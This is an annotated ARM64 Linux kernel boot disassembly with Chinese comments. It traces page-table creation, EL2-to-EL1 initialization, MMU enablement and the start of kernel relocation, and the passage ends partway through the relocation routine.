&#x2F;&#x2F;这里执行完，有两个重要的数据结构：idmap_pg_dir 和 init_pg_dir
&#x2F;&#x2F;我们将物理地址__idmap_text_start映射到虚拟地址[__idmap_text_start, __idmap_text_end],注意观察，物理地址和虚拟地址基本是一致的。
&#x2F;&#x2F;还将物理地址_text映射到虚拟地址[KIMAGE_VADDR + KASLR, _end]
0x0000000001190014:	bl	0x1190040

&#x2F;&#x2F;The following calls CPU setup code, see arch&#x2F;arm64&#x2F;mm&#x2F;proc.S
&#x2F;&#x2F;注意，这里已经准备好了SCTLR在x0中，下面就是相关的初始化，然后准备打开mmu的参数
0x0000000001190018:	bl	0xd5d6f4

&#x2F;&#x2F;最终的初始化，开启mmu，并跳转到kernel_start
0x000000000119001c:	b	0xd5d3d8

@ SYM_CODE_END(primary_entry)

  此部分对应保存启动参数，主要还是保存启动时，x0~x3。

@ SYM_CODE_START_LOCAL(preserve_boot_args)
&#x2F;&#x2F;x21保存dtb物理地址
0x0000000001190020:	mov	x21, x0
&#x2F;&#x2F;将dtb，x1,x2,x3物理地址存放到变量arch&#x2F;arm64&#x2F;kernel&#x2F;setup.c:u64 __cacheline_aligned boot_args[4];
0x0000000001190024:	adrp	x0, 0x1545000
0x0000000001190028:	add	x0, x0, #0x0
&#x2F;&#x2F;存放dtb,x1
0x000000000119002c:	stp	x21, x1, [x0]
&#x2F;&#x2F;存放x2,x3
0x0000000001190030:	stp	x2, x3, [x0, #16]

@ 刷新cache
0x0000000001190034:	dmb	sy
0x0000000001190038:	add	x1, x0, #0x20
0x000000000119003c:	b	0x2346a8

@ SYM_CODE_END(preserve_boot_args)
  此部分很长，其实主要是汇编代码稍微复杂，其基本的作用就是创建页表，这里面的创建只填充了相关的页表项。分别创建了这里执行完，有两个重要的数据结构：idmap_pg_dir和init_pg_dir的数据结构。这里用的是两级映射，第一级是全局映射，第二级是每个项2MB的映射。这里的idmap_pg_dir映射的是__cpu_setup和__primary_switch部分的内容，这部分主要涉及到mmu开启的过程，需要将物理地址和虚拟地址对应起来。init_pg_dir主要是映射的是kernel虚拟地址和kernel镜像地址。
@ SYM_FUNC_START_LOCAL(__create_page_tables)
&#x2F;&#x2F;保存返回值到x28
0x0000000001190040:	mov	x28, x30
&#x2F;&#x2F;加载init_pg_dir 到x0
0x0000000001190044:	adrp	x0, 0x181d000
&#x2F;&#x2F;加载init_pg_end 到x1
0x0000000001190048:	adrp	x1, 0x1820000
@ 刷新cache
0x000000000119004c:	bl	0x2346a8

&#x2F;&#x2F;加载init_pg_dir 到x0
0x0000000001190050:	adrp	x0, 0x181d000
&#x2F;&#x2F;加载init_pg_end 到x1
0x0000000001190054:	adrp	x1, 0x1820000
&#x2F;&#x2F;求出init_pg的大小放入x1中count
0x0000000001190058:	sub	x1, x1, x0
&#x2F;&#x2F;向x0中写入0，然后x1 -&#x3D; 64，当x1等于0时候，所有pg清理完毕。
0x000000000119005c:	stp	xzr, xzr, [x0], #16
0x0000000001190060:	stp	xzr, xzr, [x0], #16
0x0000000001190064:	stp	xzr, xzr, [x0], #16
0x0000000001190068:	stp	xzr, xzr, [x0], #16
0x000000000119006c:	subs	x1, x1, #0x40
0x0000000001190070:	b.ne	0x119005c  &#x2F;&#x2F; b.any

&#x2F;&#x2F;根据配置加载不同的flag, SWAPPER_MM_MMUFLAGS
0x0000000001190074:	mov	x7, #0x701                 	&#x2F;&#x2F; #1793

&#x2F;&#x2F; 获取idmap的页表基地址,idmap_pg_dir
0x0000000001190078:	adrp	x0, 0x117e000
@ 获取idmap的代码段虚地址，__idmap_text_start
0x000000000119007c:	adrp	x3, 0xd5d000
@ 将系统地址线位数给x5, VA_BITS_MIN
0x0000000001190080:	mov	x5, #0x27                  	&#x2F;&#x2F; #39
&#x2F;&#x2F;获取变量地址到x6, vabits_actual
0x0000000001190084:	adrp	x6, 0x1728000
0x0000000001190088:	add	x6, x6, #0x10
&#x2F;&#x2F;将39写入变量vabits_actual
0x000000000119008c:	str	x5, [x6]
0x0000000001190090:	dmb	sy
0x0000000001190094:	dc	ivac, x6

@ 判断虚拟地址空间是否够IDmap来映射
0x0000000001190098:	adrp	x5, 0xd5d000
0x000000000119009c:	clz	x5, x5
0x00000000011900a0:	cmp	x5, #0x19
@ 这里要跳转，不需要扩展虚拟地址
0x00000000011900a4:	b.ge	0x11900e0  &#x2F;&#x2F; b.tcont

@ 这部分是虚拟地址扩展的相关操作，这里不做详解
0x00000000011900a8:	adrp	x6, 0x1555000
0x00000000011900ac:	add	x6, x6, #0xcc8
0x00000000011900b0:	str	x5, [x6]
0x00000000011900b4:	dmb	sy
0x00000000011900b8:	dc	ivac, x6
0x00000000011900bc:	mov	x4, #0x200                 	&#x2F;&#x2F; #512
0x00000000011900c0:	add	x5, x0, #0x1, lsl #12
0x00000000011900c4:	mov	x6, x5
0x00000000011900c8:	orr	x6, x6, #0x3
0x00000000011900cc:	lsr	x5, x3, #39
0x00000000011900d0:	sub	x4, x4, #0x1
0x00000000011900d4:	and	x5, x5, x4
0x00000000011900d8:	str	x6, [x0, x5, lsl #3]
0x00000000011900dc:	add	x0, x0, #0x1, lsl #12

@ 从上面不需要扩展虚拟地址跳转而来，0x00000000011900a4
@ 将512 个 pgd entry存入x4
0x00000000011900e0:	adrp	x4, 0x1555000
0x00000000011900e4:	ldr	x4, [x4, #3280]

@ 将__idmap_text_end放入x6
0x00000000011900e8:	adrp	x6, 0xd5d000
0x00000000011900ec:	add	x6, x6, #0x7e0

@ 这里开始映射[__idmap_text_start, __idmap_text_end] 到 idmap_pg_dir中，
@	且，这部分内容就是cpu_setup部分的内容，恰好对应开启mmu的代码。
&#x2F;&#x2F;tbl:    x0 &#x3D; idmap_pg_dir &#x3D; 0x117e000
&#x2F;&#x2F;rtbl:   x1 &#x3D; 0 
&#x2F;&#x2F;vstart: x3 &#x3D; __idmap_text_start &#x3D; 0xd5d000
&#x2F;&#x2F;vend:   x6 &#x3D; __idmap_text_end &#x3D; 0xd5d7e0
&#x2F;&#x2F;flags:  x7 &#x3D; SWAPPER_MM_MMUFLAGS
&#x2F;&#x2F;phys:   x3 &#x3D; __idmap_text_start &#x3D; 0xd5d000
&#x2F;&#x2F;pgds:   x4 &#x3D; idmap_ptrs_per_pgd &#x3D; 512
&#x2F;&#x2F;tmp regs: x10, x11, x12, x13, x14
@ macro map_memory start ...
@ __idmap_text_end - 1 是idmap映射结束的地方
0x00000000011900f0:	sub	x6, x6, #0x1
@ x1 &#x3D; idmap的页表基地址（idmap_pg_dir） + 2^12 ，并指向了下一个page entry
0x00000000011900f4:	add	x1, x0, #0x1, lsl #12
@ 将x1 保存到 x14
0x00000000011900f8:	mov	x14, x1
@ 将count赋值为0
0x00000000011900fc:	mov	x13, #0x0                   	&#x2F;&#x2F; #0

&#x2F;&#x2F; vstart:	x3 &#x3D; __idmap_text_start &#x3D; 0xd5d000
&#x2F;&#x2F; vend:	x6 &#x3D; __idmap_text_end &#x3D; 0xd5d7e0
&#x2F;&#x2F; shift:	30
&#x2F;&#x2F; ptrs:	x4 &#x3D; idmap_ptrs_per_pgd &#x3D; 512
&#x2F;&#x2F; istart:	x10
&#x2F;&#x2F; iend:	
&#x2F;&#x2F; count:	x13
@ compute_indices  start ...
&#x2F;&#x2F;将vend右逻辑偏移shift(30)位
0x0000000001190100:	lsr	x11, x6, #30
&#x2F;&#x2F;将ptrs（number of entries in page table）存放到istart, 每个表512项
0x0000000001190104:	mov	x10, x4
&#x2F;&#x2F;pte 数量减一
0x0000000001190108:	sub	x10, x10, #0x1

&#x2F;&#x2F;此时算出来vend的pgd index,根据虚拟地址右移30位，还剩9位，恰好表示512个项的id。
&#x2F;&#x2F; iend &#x3D; (vend &gt;&gt; shift) &amp; (ptrs - 1)
0x000000000119010c:	and	x11, x11, x10
0x0000000001190110:	mov	x10, x4
0x0000000001190114:	mul	x10, x10, x13
&#x2F;&#x2F; iend +&#x3D; count * ptrs
0x0000000001190118:	add	x11, x11, x10

&#x2F;&#x2F;将vstart右逻辑偏移shift位
0x000000000119011c:	lsr	x10, x3, #30
0x0000000001190120:	mov	x13, x4
0x0000000001190124:	sub	x13, x13, #0x1
&#x2F;&#x2F; istart &#x3D; (vstart &gt;&gt; shift) &amp; (ptrs - 1), 此时算出来vstart的pgd index
0x0000000001190128:	and	x10, x10, x13
&#x2F;&#x2F;计算出多少项page entry
0x000000000119012c:	sub	x13, x11, x10
@ compute_indices  end ...



@ populate_entries start ... 
0x0000000001190130:	mov	x12, x1
&#x2F;&#x2F;给当前entry设置内存属性
0x0000000001190134:	orr	x12, x12, #0x3
@ 向一级页表idmap_pg_dir（0x117e000）存入二级页表地址（0x117f000）
0x0000000001190138:	str	x12, [x0, x10, lsl #3]
0x000000000119013c:	add	x1, x1, #0x1, lsl #12
0x0000000001190140:	add	x10, x10, #0x1
0x0000000001190144:	cmp	x10, x11
0x0000000001190148:	b.ls	0x1190130  &#x2F;&#x2F; b.plast
@ populate_entries end ... 

&#x2F;&#x2F;注意，这里相当于tbl&#x3D;tbl+PAGE_SIZE,主要还是指向了二级页表
&#x2F;&#x2F;相当于现在一级页表为:idmap_pg_dir（0x117e000）,里面存放的是0x0117f003
&#x2F;&#x2F;这里的x14是二级页表的地址，为0x0117f000
0x000000000119014c:	mov	x0, x14
&#x2F;&#x2F;sv &#x3D; rtbl &#x3D; tbl+PAGE_SIZE+PAGE_SIZE，相当于指向了三级页表
0x0000000001190150:	mov	x14, x1

@ compute_indices  start ...
&#x2F;&#x2F;将vend右逻辑偏移shift位
0x0000000001190154:	lsr	x11, x6, #21
&#x2F;&#x2F;将ptrs（number of entries in page table）存放到istart, 每个表512项
0x0000000001190158:	mov	x10, #0x200                 	&#x2F;&#x2F; #512
&#x2F;&#x2F;pte 数量减一
0x000000000119015c:	sub	x10, x10, #0x1

&#x2F;&#x2F;此时算出来vend的pgd index
&#x2F;&#x2F; iend &#x3D; (vend &gt;&gt; shift) &amp; (ptrs - 1)
0x0000000001190160:	and	x11, x11, x10
0x0000000001190164:	mov	x10, #0x200                 	&#x2F;&#x2F; #512
0x0000000001190168:	mul	x10, x10, x13
&#x2F;&#x2F; iend +&#x3D; count * ptrs
0x000000000119016c:	add	x11, x11, x10

&#x2F;&#x2F;将vstart右逻辑偏移shift位
0x0000000001190170:	lsr	x10, x3, #21
0x0000000001190174:	mov	x13, #0x200                 	&#x2F;&#x2F; #512
0x0000000001190178:	sub	x13, x13, #0x1
&#x2F;&#x2F; istart &#x3D; (vstart &gt;&gt; shift) &amp; (ptrs - 1), 此时算出来vstart的pgd index
0x000000000119017c:	and	x10, x10, x13
&#x2F;&#x2F;计算出多少项page entry
0x0000000001190180:	sub	x13, x11, x10
@ compute_indices  end ...

@ x13 &#x3D; 0xc00000, x3 &#x3D; 0xd5d000
0x0000000001190184:	and	x13, x3, #0xffffffffffe00000

@ populate_entries start ... 
@ x12 &#x3D; 0xc00000
0x0000000001190188:	mov	x12, x13
&#x2F;&#x2F;给当前entry设置内存属性
0x000000000119018c:	orr	x12, x12, x7
@ 向二级页表(0x117f000 + 6*8 &#x3D; 0x117f030)存入地址0xc00701
0x0000000001190190:	str	x12, [x0, x10, lsl #3]
0x0000000001190194:	add	x13, x13, #0x200, lsl #12
0x0000000001190198:	add	x10, x10, #0x1
0x000000000119019c:	cmp	x10, x11
0x00000000011901a0:	b.ls	0x1190188  &#x2F;&#x2F; b.plast
@ populate_entries end ... 

@ init_pg_dir  给x0
0x00000000011901a4:	adrp	x0, 0x181d000
@ KIMAGE_VADDR 给x5
0x00000000011901a8:	mov	x5, #0xffffffc0ffffffff    	&#x2F;&#x2F; #-270582939649
0x00000000011901ac:	movk	x5, #0x800, lsl #16
0x00000000011901b0:	movk	x5, #0x0
&#x2F;&#x2F; add KASLR displacement
0x00000000011901b4:	add	x5, x5, x23
@ 将页表项数目给x4
0x00000000011901b8:	mov	x4, #0x200                 	&#x2F;&#x2F; #512
@ _end 给x6
0x00000000011901bc:	adrp	x6, 0x1820000
@ _start 给x3
0x00000000011901c0:	adrp	x3, 0x200000
@ 求出_end-_start
0x00000000011901c4:	sub	x6, x6, x3
@ 算出基于KIMAGE_VADDR和KASLR的偏移
0x00000000011901c8:	add	x6, x6, x5

&#x2F;&#x2F;tbl:    x0 &#x3D; init_pg_dir
&#x2F;&#x2F;rtbl:   x1 &#x3D; 0
&#x2F;&#x2F;vstart: x5 &#x3D; KIMAGE_VADDR + KASLR
&#x2F;&#x2F;vend:   x6 &#x3D; _end
&#x2F;&#x2F;flags:  x7 &#x3D; SWAPPER_MM_MMUFLAGS
&#x2F;&#x2F;phys:   x3 &#x3D; _text
&#x2F;&#x2F;pgds:   x4 &#x3D; PTRS_PER_PGD
&#x2F;&#x2F;tmp regs: x10, x11, x12, x13, x14
@ macro map_memory start ...
@ 开始填充页表init_pg_dir
0x00000000011901cc:	sub	x6, x6, #0x1
0x00000000011901d0:	add	x1, x0, #0x1, lsl #12
0x00000000011901d4:	mov	x14, x1
0x00000000011901d8:	mov	x13, #0x0                   	&#x2F;&#x2F; #0
0x00000000011901dc:	lsr	x11, x6, #30
0x00000000011901e0:	mov	x10, x4
0x00000000011901e4:	sub	x10, x10, #0x1
0x00000000011901e8:	and	x11, x11, x10
0x00000000011901ec:	mov	x10, x4
0x00000000011901f0:	mul	x10, x10, x13
0x00000000011901f4:	add	x11, x11, x10
0x00000000011901f8:	lsr	x10, x5, #30
0x00000000011901fc:	mov	x13, x4
0x0000000001190200:	sub	x13, x13, #0x1
0x0000000001190204:	and	x10, x10, x13
0x0000000001190208:	sub	x13, x11, x10
0x000000000119020c:	mov	x12, x1
0x0000000001190210:	orr	x12, x12, #0x3
0x0000000001190214:	str	x12, [x0, x10, lsl #3]
0x0000000001190218:	add	x1, x1, #0x1, lsl #12
0x000000000119021c:	add	x10, x10, #0x1
0x0000000001190220:	cmp	x10, x11
0x0000000001190224:	b.ls	0x119020c  &#x2F;&#x2F; b.plast
0x0000000001190228:	mov	x0, x14
0x000000000119022c:	mov	x14, x1
0x0000000001190230:	lsr	x11, x6, #21
0x0000000001190234:	mov	x10, #0x200                 	&#x2F;&#x2F; #512
0x0000000001190238:	sub	x10, x10, #0x1
0x000000000119023c:	and	x11, x11, x10
0x0000000001190240:	mov	x10, #0x200                 	&#x2F;&#x2F; #512
0x0000000001190244:	mul	x10, x10, x13
0x0000000001190248:	add	x11, x11, x10
0x000000000119024c:	lsr	x10, x5, #21
0x0000000001190250:	mov	x13, #0x200                 	&#x2F;&#x2F; #512
0x0000000001190254:	sub	x13, x13, #0x1
0x0000000001190258:	and	x10, x10, x13
0x000000000119025c:	sub	x13, x11, x10
0x0000000001190260:	and	x13, x3, #0xffffffffffe00000
0x0000000001190264:	mov	x12, x13
0x0000000001190268:	orr	x12, x12, x7
0x000000000119026c:	str	x12, [x0, x10, lsl #3]
0x0000000001190270:	add	x13, x13, #0x200, lsl #12
0x0000000001190274:	add	x10, x10, #0x1
0x0000000001190278:	cmp	x10, x11
0x000000000119027c:	b.ls	0x1190264  &#x2F;&#x2F; b.plast
@ macro map_memory end ...


&#x2F;&#x2F;内存屏障
0x0000000001190280:	dmb	sy
@ 刷新cache
0x0000000001190284:	adrp	x0, 0x117e000
0x0000000001190288:	adrp	x1, 0x1181000
0x000000000119028c:	bl	0x2346a8
@ 刷新cache
0x0000000001190290:	adrp	x0, 0x181d000
0x0000000001190294:	adrp	x1, 0x1820000
0x0000000001190298:	bl	0x2346a8
@ 返回到bl	__cpu_setup
0x000000000119029c:	ret	x28


@ SYM_FUNC_END(__create_page_tables)


  这部分是刷新i/d cache

@ dcache_inval_poc start ...
0x00000000002346a8:	mrs	x3, ctr_el0
0x00000000002346ac:	nop
0x00000000002346b0:	ubfx	x3, x3, #16, #4
0x00000000002346b4:	mov	x2, #0x4                   	&#x2F;&#x2F; #4
0x00000000002346b8:	lsl	x2, x2, x3
0x00000000002346bc:	sub	x3, x2, #0x1
0x00000000002346c0:	tst	x1, x3
0x00000000002346c4:	bic	x1, x1, x3
0x00000000002346c8:	b.eq	0x2346d0  &#x2F;&#x2F; b.none
0x00000000002346cc:	dc	civac, x1
0x00000000002346d0:	tst	x0, x3
0x00000000002346d4:	bic	x0, x0, x3
0x00000000002346d8:	b.eq	0x2346e4  &#x2F;&#x2F; b.none
0x00000000002346dc:	dc	civac, x0
0x00000000002346e0:	b	0x2346e8
0x00000000002346e4:	dc	ivac, x0
0x00000000002346e8:	add	x0, x0, x2
0x00000000002346ec:	cmp	x0, x1
0x00000000002346f0:	b.cc	0x2346e4  &#x2F;&#x2F; b.lo, b.ul, b.last
0x00000000002346f4:	dsb	sy
0x00000000002346f8:	ret
@ dcache_inval_poc end ...
  这部分就是对应的是开始的在el2模式下初始化，并返回到el1，并保存启动参数。
@ SYM_FUNC_START(init_kernel_el)
&#x2F;&#x2F;读取当前的异常等级
0x0000000000d5d000:	mrs	x0, currentel
&#x2F;&#x2F;判断是否为异常等级2
0x0000000000d5d004:	cmp	x0, #0x8
&#x2F;&#x2F;跳转到el2(qemu 模拟机器执行路径)， init_el2
0x0000000000d5d008:	b.eq	0xd5d034  &#x2F;&#x2F; b.none
0x0000000000d5d00c:	mov	x0, #0x30500000            	&#x2F;&#x2F; #810549248
0x0000000000d5d010:	movk	x0, #0x800
0x0000000000d5d014:	msr	sctlr_el1, x0
0x0000000000d5d018:	isb
0x0000000000d5d01c:	movz	x0, #0x0, lsl #16
0x0000000000d5d020:	movk	x0, #0x3c5
0x0000000000d5d024:	msr	spsr_el1, x0
0x0000000000d5d028:	msr	elr_el1, x30
0x0000000000d5d02c:	mov	w0, #0xe11                 	&#x2F;&#x2F; #3601
0x0000000000d5d030:	eret

@ init_el2 start ... ...
&#x2F;&#x2F;配置hcr_el2寄存器,HCR(Hypervisor Configuration Register)
0x0000000000d5d034:	mov	x0, #0x100000000000000     	&#x2F;&#x2F; #72057594037927936
0x0000000000d5d038:	movk	x0, #0x300, lsl #32
0x0000000000d5d03c:	movk	x0, #0x8000, lsl #16
0x0000000000d5d040:	movk	x0, #0x0
0x0000000000d5d044:	msr	hcr_el2, x0
&#x2F;&#x2F;ISB. 指令同步屏障
0x0000000000d5d048:	isb

&#x2F;&#x2F;初始化el2下的各种状态
&#x2F;*
.macro init_el2_state
	__init_el2_sctlr
	__init_el2_timers
	__init_el2_debug
	__init_el2_lor
	__init_el2_stage2
	__init_el2_gicv3
	__init_el2_hstr
	__init_el2_nvhe_idregs
	__init_el2_nvhe_cptr
	__init_el2_nvhe_sve
	__init_el2_fgt
	__init_el2_nvhe_prepare_eret
.endm
*&#x2F;

&#x2F;&#x2F;__init_el2_sctlr
0x0000000000d5d04c:	mov	x0, #0x30c50000            	&#x2F;&#x2F; #818216960
0x0000000000d5d050:	movk	x0, #0x830
0x0000000000d5d054:	msr	sctlr_el2, x0
0x0000000000d5d058:	isb

&#x2F;&#x2F;__init_el2_timers
0x0000000000d5d05c:	mov	x0, #0x3                   	&#x2F;&#x2F; #3
0x0000000000d5d060:	msr	cnthctl_el2, x0
0x0000000000d5d064:	msr	cntvoff_el2, xzr

&#x2F;&#x2F;__init_el2_debug
0x0000000000d5d068:	mrs	x1, id_aa64dfr0_el1
0x0000000000d5d06c:	sbfx	x0, x1, #8, #4
0x0000000000d5d070:	cmp	x0, #0x1
0x0000000000d5d074:	b.lt	0xd5d080  &#x2F;&#x2F; b.tstop
0x0000000000d5d078:	mrs	x0, pmcr_el0
0x0000000000d5d07c:	ubfx	x0, x0, #11, #5
0x0000000000d5d080:	csel	x2, xzr, x0, lt  &#x2F;&#x2F; lt &#x3D; tstop
0x0000000000d5d084:	ubfx	x0, x1, #32, #4
0x0000000000d5d088:	cbz	x0, 0xd5d0a8
0x0000000000d5d08c:	mrs	x0, pmbidr_el1
0x0000000000d5d090:	and	x0, x0, #0x10
0x0000000000d5d094:	cbnz	x0, 0xd5d0a0
0x0000000000d5d098:	mov	x0, #0x50                  	&#x2F;&#x2F; #80
0x0000000000d5d09c:	msr	pmscr_el2, x0
0x0000000000d5d0a0:	mov	x0, #0x3000                	&#x2F;&#x2F; #12288
0x0000000000d5d0a4:	orr	x2, x2, x0
0x0000000000d5d0a8:	ubfx	x0, x1, #44, #4
0x0000000000d5d0ac:	cbz	x0, 0xd5d0c4
0x0000000000d5d0b0:	mrs	x0, s3_0_c9_c11_7
0x0000000000d5d0b4:	and	x0, x0, #0x10
0x0000000000d5d0b8:	cbnz	x0, 0xd5d0c4
0x0000000000d5d0bc:	mov	x0, #0x3000000             	&#x2F;&#x2F; #50331648
0x0000000000d5d0c0:	orr	x2, x2, x0
0x0000000000d5d0c4:	msr	mdcr_el2, x2

&#x2F;&#x2F;__init_el2_lor
0x0000000000d5d0c8:	mrs	x1, id_aa64mmfr1_el1
0x0000000000d5d0cc:	ubfx	x0, x1, #16, #4
0x0000000000d5d0d0:	cbz	x0, 0xd5d0d8
0x0000000000d5d0d4:	msr	s3_0_c10_c4_3, xzr

&#x2F;&#x2F;__init_el2_stage2
0x0000000000d5d0d8:	msr	vttbr_el2, xzr

&#x2F;&#x2F;__init_el2_gicv3
0x0000000000d5d0dc:	mrs	x0, id_aa64pfr0_el1
0x0000000000d5d0e0:	ubfx	x0, x0, #24, #4
0x0000000000d5d0e4:	cbz	x0, 0xd5d108
0x0000000000d5d0e8:	mrs	x0, s3_4_c12_c9_5
0x0000000000d5d0ec:	orr	x0, x0, #0x1
0x0000000000d5d0f0:	orr	x0, x0, #0x8
0x0000000000d5d0f4:	msr	s3_4_c12_c9_5, x0
0x0000000000d5d0f8:	isb
0x0000000000d5d0fc:	mrs	x0, s3_4_c12_c9_5
0x0000000000d5d100:	tbz	w0, #0, 0xd5d108
0x0000000000d5d104:	msr	s3_4_c12_c11_0, xzr

&#x2F;&#x2F;__init_el2_hstr
0x0000000000d5d108:	msr	hstr_el2, xzr

&#x2F;&#x2F;__init_el2_nvhe_idregs
0x0000000000d5d10c:	mrs	x0, midr_el1
0x0000000000d5d110:	mrs	x1, mpidr_el1
0x0000000000d5d114:	msr	vpidr_el2, x0
0x0000000000d5d118:	msr	vmpidr_el2, x1

&#x2F;&#x2F;__init_el2_nvhe_cptr
0x0000000000d5d11c:	mov	x0, #0x33ff                	&#x2F;&#x2F; #13311
0x0000000000d5d120:	msr	cptr_el2, x0

&#x2F;&#x2F;__init_el2_nvhe_sve
0x0000000000d5d124:	mrs	x1, id_aa64pfr0_el1
0x0000000000d5d128:	ubfx	x1, x1, #32, #4
0x0000000000d5d12c:	cbz	x1, 0xd5d144
0x0000000000d5d130:	and	x0, x0, #0xfffffffffffffeff
0x0000000000d5d134:	msr	cptr_el2, x0
0x0000000000d5d138:	isb
0x0000000000d5d13c:	mov	x1, #0x1ff                 	&#x2F;&#x2F; #511
0x0000000000d5d140:	msr	zcr_el2, x1

&#x2F;&#x2F;__init_el2_fgt
0x0000000000d5d144:	mrs	x1, id_aa64mmfr0_el1
0x0000000000d5d148:	ubfx	x1, x1, #56, #4
0x0000000000d5d14c:	cbz	x1, 0xd5d18c
0x0000000000d5d150:	mov	x0, xzr
0x0000000000d5d154:	mrs	x1, id_aa64dfr0_el1
0x0000000000d5d158:	ubfx	x1, x1, #32, #4
0x0000000000d5d15c:	cmp	x1, #0x3
0x0000000000d5d160:	b.lt	0xd5d168  &#x2F;&#x2F; b.tstop
0x0000000000d5d164:	orr	x0, x0, #0x4000000000000000
0x0000000000d5d168:	msr	s3_4_c3_c1_4, x0
0x0000000000d5d16c:	msr	s3_4_c3_c1_5, x0
0x0000000000d5d170:	msr	s3_4_c1_c1_4, xzr
0x0000000000d5d174:	msr	s3_4_c1_c1_5, xzr
0x0000000000d5d178:	msr	s3_4_c1_c1_6, xzr
0x0000000000d5d17c:	mrs	x1, id_aa64pfr0_el1
0x0000000000d5d180:	ubfx	x1, x1, #44, #4
0x0000000000d5d184:	cbz	x1, 0xd5d18c
0x0000000000d5d188:	msr	s3_4_c3_c1_6, xzr

&#x2F;&#x2F; __init_el2_nvhe_prepare_eret
0x0000000000d5d18c:	mov	x0, #0x3c5                 	&#x2F;&#x2F; #965
0x0000000000d5d190:	msr	spsr_el2, x0


&#x2F;&#x2F;加载el2的中断向量表
0x0000000000d5d194:	adrp	x0, 0xd4f000
0x0000000000d5d198:	add	x0, x0, #0x0
0x0000000000d5d19c:	msr	vbar_el2, x0
0x0000000000d5d1a0:	isb

&#x2F;*
	* Fruity CPUs seem to have HCR_EL2.E2H set to RES1,
	* making it impossible to start in nVHE mode. Is that
	* compliant with the architecture? Absolutely not!
*&#x2F;
0x0000000000d5d1a4:	mrs	x0, hcr_el2
0x0000000000d5d1a8:	and	x0, x0, #0x400000000
&#x2F;&#x2F;跳转到1f(0xd5d1d0)位置继续执行
0x0000000000d5d1ac:	cbz	x0, 0xd5d1d0

0x0000000000d5d1b0:	mov	x0, #0x30500000            	&#x2F;&#x2F; #810549248
0x0000000000d5d1b4:	movk	x0, #0x800
0x0000000000d5d1b8:	msr	sctlr_el12, x0
0x0000000000d5d1bc:	mov	x0, #0x3c9                 	&#x2F;&#x2F; #969
0x0000000000d5d1c0:	msr	spsr_el1, x0
0x0000000000d5d1c4:	adr	x0, 0xd5d1e8
0x0000000000d5d1c8:	msr	elr_el1, x0
0x0000000000d5d1cc:	eret

&#x2F;&#x2F;将x0写入sctlr_el1
0x0000000000d5d1d0:	mov	x0, #0x30500000            	&#x2F;&#x2F; #810549248
0x0000000000d5d1d4:	movk	x0, #0x800
0x0000000000d5d1d8:	msr	sctlr_el1, x0

&#x2F;&#x2F;将当前的lr(x30)地址放到elr_el2中，后续eret到el1时，跳转到此地址执行
0x0000000000d5d1dc:	msr	elr_el2, x30
&#x2F;&#x2F;将flag写入w0中
0x0000000000d5d1e0:	mov	w0, #0xe12                 	&#x2F;&#x2F; #3602
&#x2F;&#x2F;注意这里的返回值，这里返回到elr_el2指向的地方，
&#x2F;&#x2F;也就是adrp	x23, __PHYS_OFFSET, 0x0000000001190008
0x0000000000d5d1e4:	eret


0x0000000000d5d1e8:	mov	x0, #0x3                   	&#x2F;&#x2F; #3
0x0000000000d5d1ec:	hvc	#0x0
0x0000000000d5d1f0:	mov	x0, #0xe12                 	&#x2F;&#x2F; #3602
0x0000000000d5d1f4:	ret

@ SYM_FUNC_END(init_kernel_el)


@ SYM_FUNC_START_LOCAL(set_cpu_boot_mode_flag)
&#x2F;&#x2F;加载__boot_cpu_mode符号地址，此地址存放
0x0000000000d5d1f8:	adrp	x1, 0x1728000
0x0000000000d5d1fc:	add	x1, x1, #0x0
0x0000000000d5d200:	cmp	w0, #0xe12
0x0000000000d5d204:	b.ne	0xd5d20c  &#x2F;&#x2F; b.any
0x0000000000d5d208:	add	x1, x1, #0x4
0x0000000000d5d20c:	str	w0, [x1]
0x0000000000d5d210:	dmb	sy
0x0000000000d5d214:	dc	ivac, x1
@ 返回到0x0000000001190014
0x0000000000d5d218:	ret

@ SYM_FUNC_END(set_cpu_boot_mode_flag)

  这里包含3个步骤：


这里其实包含了开启mmu，mmu开启时，tbbr0_el1是idmap_pg_dir，tbbr1_el1是init_pg_dir，还是使用的物理地址，所以这个时候的地址翻译由页表idmap_pg_dir来支持。


当完成mmu开启后，就会将.rela.dyn段实现重定位，因为这部分的符号的实际地址为0，需要我们填写为实际的符号地址。


当重定位完成后，会加载__primary_switched的虚拟地址，其地址在内核空间，当执行blr 跳转到__primary_switched的时候，这个时候的地址返回由页表init_pg_dir来支持。


@ SYM_FUNC_START(__enable_mmu)
&#x2F;*
符合ARMv8的PE最大支持的物理地址宽度也是48个bit，当然，具体的实现可以自己定义
（不能超过48个bit），具体的配置可以通过ID_AA64MMFR0_EL1 
（AArch64 Memory Model Feature Register 0）这个RO寄存器获取
*&#x2F;
0xd5d308        mrs    x2, id_aa64mmfr0_el1     
@ 判断物理地址宽度是否满足最小和最大的要求。
0xd5d30c        ubfx   x2, x2, #28, #4                                        
0xd5d310        cmp    x2, #0x0                                               
0xd5d314        b.lt   0xd5d36c  &#x2F;&#x2F; b.tstop                                   
0xd5d318        cmp    x2, #0x7                                               
0xd5d31c        b.gt   0xd5d36c     

&#x2F;&#x2F;update_early_cpu_boot_status
0xd5d320        mov    x3, #0x0                        &#x2F;&#x2F; #0                  
0xd5d324        adrp   x2, 0x1728000                                          
0xd5d328        add    x2, x2, #0x8                                           
0xd5d32c        str    x3, [x2]                                               
0xd5d330        dmb    sy                                                     
0xd5d334        dc     ivac, x2   

&#x2F;&#x2F;加载idmap_pg_dir到ttbr0
&#x2F;&#x2F;注意，跳转过来时，x1是init_gdir
0xd5d338        adrp   x2, 0x117e000                                          
0xd5d33c        mov    x1, x1                                                 
0xd5d340        mov    x2, x2           

&#x2F;&#x2F;加载两个映射表到tbbr0和1,在el1模式下面
0xd5d344        msr    ttbr0_el1, x2                                          
0xd5d348        msr    ttbr1_el1, x1                                          
0xd5d34c        isb     

&#x2F;&#x2F;打开mmu
0xd5d350        msr    sctlr_el1, x0                                          
0xd5d354        isb                                                           
0xd5d358        ic     iallu                                                  
0xd5d35c        dsb    nsh                                                    
0xd5d360        isb                                                           
0xd5d364        ret  
@ SYM_FUNC_END(__enable_mmu)

&#x2F;&#x2F;此部分作用为解决符号重定位问题
&#x2F;&#x2F;readelf -r vmlinux 读取重定位表
&#x2F;&#x2F;readelf -S vmlinux 读取所有section头
&#x2F;&#x2F;hexdump -s 0x24000 -n 16 vmlinux 读取重定位表中的第一项的目的地址内容，
&#x2F;&#x2F;       可以发现为8个0，需要我们来手动填写符号重定位地址
@ SYM_FUNC_START_LOCAL(__relocate_kernel)
0xd5d390        ldr    w9, 0xd5d438   &#x2F;&#x2F; offset to reloc table                                                                                                                                    │
